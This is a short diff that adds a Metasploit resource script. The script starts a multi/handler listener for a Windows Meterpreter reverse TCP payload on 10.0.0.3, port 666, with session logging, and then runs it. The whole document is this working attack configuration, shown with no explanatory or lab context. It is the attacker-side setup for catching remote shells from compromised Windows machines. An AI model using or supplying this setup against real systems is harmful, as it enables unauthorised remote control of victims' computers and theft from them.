@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.0.0.3
+set lport 666
+set SessionLogging true
+exploit
